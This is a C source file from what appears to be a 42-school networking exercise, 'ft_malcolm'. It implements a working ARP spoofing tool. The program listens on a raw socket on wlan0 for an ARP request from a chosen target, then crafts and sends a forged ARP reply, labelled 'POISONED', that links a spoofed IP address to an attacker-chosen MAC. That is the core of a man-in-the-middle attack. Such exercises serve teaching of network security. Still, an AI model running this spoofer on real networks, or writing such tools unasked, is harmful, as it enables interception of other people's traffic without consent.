/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jragot <jragot@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/15 21:21:52 by jragot            #+#    #+#             */
/*   Updated: 2021/11/02 01:44:34 by jragot           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

struct addr_set g_addresses;
int	waiting_for_reply = 1;
int fd = -1;

struct hostent *gethost(const char *name)
{
	struct hostent *host = NULL;
	if ((host = gethostbyname(name)) != NULL)
		return (host);
	else
		printf("Error: %s is not a valid hostname\n", name);
	return (NULL);
}

struct ifaddrs *getinterface(struct ifaddrs *iflist,const char *name)
{
	while (iflist)
	{
		if (strcmp(iflist->ifa_name, name) == 0) // *** LIBC
			return (iflist);
		iflist = iflist->ifa_next;
	}
	return (NULL);
}

unsigned char	*craft_arp(unsigned char *output)
{
	struct ethhdr frame;
	struct arp_ip packet;
	
	memset(&frame, 0, sizeof(frame));			// *** LIBC
	memset(&packet, 0, sizeof(packet));			// *** LIBC
	memcpy(frame.h_dest, g_addresses.tmac, 6); // *** LIBC
	memcpy(frame.h_source, g_addresses.smac, 6); // *** LIBC
	memcpy(&frame.h_proto, "\x08\x06", 2);		// *** LIBC
	memcpy(packet.ar_hrd, "\x00\x01", 2);
	memcpy(packet.ar_pro, "\x08\x00", 2);
	packet.ar_hln = 6;
	packet.ar_pln = 4;
	memcpy(packet.ar_op, "\x00\x02", 2); // ARP REPLY OPCODE
	memcpy(packet.ar_sha, g_addresses.smac, 6);
	memcpy(packet.ar_sip, &g_addresses.sip, 4);
	memcpy(packet.ar_tha, g_addresses.tmac, 6);
	memcpy(packet.ar_tip, &g_addresses.tip, 4);
	memcpy(output, &frame, 28);					// *** LIBC
	memcpy(output+sizeof(frame), &packet, sizeof(packet));
	return (output);
}

void	initialize_device(struct sockaddr_ll *device)
{
	memset(device, 0, sizeof(struct sockaddr_ll)); // LIBC
	device->sll_family = AF_PACKET;
	device->sll_ifindex = WLAN0;
	device->sll_halen = ETH_ALEN;
	device->sll_protocol = htons(ETH_P_ARP);
	memcpy(device->sll_addr, &g_addresses.tmac, ETH_ALEN); // LIBC
}

void	arp_reply(struct arp_ip *request) // Maybe we can remove the function parameter
{
	struct sockaddr_ll device = {0};
	int bytes_sent = 0;
	unsigned char reply_output[42];

	initialize_device(&device);
	printf("\e[31m(ARP REQUEST DETECTED FROM %d.%d.%d.%d)\n", request->ar_sip[0], request->ar_sip[1], request->ar_sip[2], request->ar_sip[3]);
	craft_arp(reply_output);
	printf("------ REPLYING (POISONED): ------\n");
	process_ethernet(reply_output, 42);
	printf("------ END OF REPLY: ------\e[0m\n");
	if ((bytes_sent = sendto(fd, reply_output, sizeof(reply_output), 0, (struct sockaddr *)&device, sizeof(device)) < 0))
		perror("error");	// LIBC
	waiting_for_reply = 0;
}

void	process_arp(unsigned char *buffer)
{
	struct arp_ip *arp = (struct arp_ip *)(buffer); /* We create this structure specific to IP protocol for later */

	buffer += sizeof(struct arphdr);
	printf("\n----ARP PAYLOAD:----\n");
	printf("|-Sender HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	printf("|-Target HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	if (arp->ar_op[0] || (arp->ar_op[1] < 1 || arp->ar_op[1] > 2))
		printf("|-opcode: %.2x (Unknown operation)\n", arp->ar_op[1]);
	else
		printf("|-opcode: %.2x %s\n", arp->ar_op[1], (arp->ar_op[1] == 1) ? "(REQUEST)" : "(REPLY)");
	if (arp->ar_op[0] == 0 && arp->ar_op[1] == 1) /* We check if this is an ARP REQUEST */
		if (memcmp(arp->ar_sip, &g_addresses.tip, 4) == 0) /* and if the request is from the target IP... */
			if (memcmp(arp->ar_sha, &g_addresses.tmac, 6) == 0) /* and from the target MAC address */
				if (memcmp(arp->ar_tip, &g_addresses.sip, 4) == 0) /* and if it's about the MAC address to spoof */
					{
						sleep(2);		// LIBC
						arp_reply(arp);
					}
	printf("------------------------------------\n\n");
}

void	process_ethernet(unsigned char *buffer, ssize_t buflen)
{
	struct ethhdr *eth = (struct ethhdr *)(buffer);

	if (ntohs(eth->h_proto) == ETH_P_ARP)
	{
		printf("\n*** ARP PACKET ***\nRaw frame:");
		print_buffer(buffer, buflen);
		printf("(%d bytes read from socket)\n", (unsigned int)buflen);
		printf("\n----ETHERNET HEADER:----\n");
		printf("|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
		printf("|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
		printf("|-Protocol : %04x\n",ntohs(eth->h_proto));
		process_arp(buffer+sizeof(struct ethhdr));
	}
}

int	main(int ac, char **av)
{
	struct ifaddrs *iflist = NULL;
	struct ifaddrs *interface = NULL;
	unsigned char buffer[65536];
	ssize_t buflen = 0;
	struct sockaddr saddr;
	int saddr_len = sizeof(saddr);
 	unsigned char output[42] = {0};  // Temporary fixing weird bug. To remove eventually

	requirements(ac, av);

	if (signal(SIGINT, sig_handler) == SIG_ERR)
		exit_error("Could not catch signal\n");
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		perror("error");							// *** LIBC
	if ((getifaddrs(&iflist) < 0))
		exit_error("Error: Failed to fetch interfaces");
	if ((interface = getinterface(iflist, "wlan0")))
		printf("Working on interface %s.\n", interface->ifa_name);
	memset(buffer, 0, 65536);						// *** LIBC
	memset(&g_addresses, 0, sizeof(g_addresses));	// *** LIBC
	g_addresses.sip = inet_addr(av[1]);
	feed_bin(g_addresses.smac, av[2]);
	g_addresses.tip = inet_addr(av[3]);
	feed_bin(g_addresses.tmac, av[4]);
	process_ethernet(output, 42);	// Temporary fixing weird bug. To remove eventually
	while (waiting_for_reply)
	{
		buflen = recvfrom(fd, buffer, 65536, 0, &saddr, (socklen_t *)&saddr_len);
		if (buflen < 0)
			exit_error("Failed to read from socket");
		process_ethernet(buffer, buflen);
	}
	/* Clean up */
	(close(fd)) != 0 ? printf("Error closing socket\n") : 0;
	if (iflist)
		freeifaddrs(iflist);
	return (0);
}
